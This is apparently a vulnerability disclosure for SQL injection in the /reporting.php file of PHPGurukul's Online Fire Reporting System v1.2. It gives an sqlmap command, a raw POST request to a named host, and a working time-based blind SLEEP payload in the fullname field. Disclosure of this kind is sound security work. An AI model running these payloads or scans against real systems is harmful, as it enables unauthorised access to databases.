# SQLi vulnerability in Online Fire Reporting System v1.2 of file /reporting.php

**vender**:

- [PHPGurukul](https://vuldb.com/?vendor.phpgurukul)
- Online Fire Reporting System

**SoftLink**:

- [Online Fire Reporting System Project in PHP- PHPGurukul](https://phpgurukul.com/online-fire-reporting-system-using-php-and-mysql/)

**Vulnerable File**

- /reporting.php

**Version**

- V1.2

### POC

```bash
sqlmap -r request.txt --level 5 --random-agent
```



```http
POST /reporting.php HTTP/1.1
Host: www.firereport.top
Content-Type: application/x-www-form-urlencoded
Referer: http://www.firereport.top/reporting.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=vhqmp6o0p6p8lf7sscpqhrp6tf
Origin: http://www.firereport.top
Content-Length: 90

fullname=1&mobilenumber=1&location=1&message=1&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```





```
sqlmap identified the following injection point(s) with a total of 6358 HTTP(s) requests:
---
Parameter: fullname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: fullname=1' AND (SELECT 4364 FROM (SELECT(SLEEP(5)))JHEp) AND 'uDFv'='uDFv&mobilenumber=1&location=1&message=1&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
---
```

![image-20250531183640108](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505311836268.png)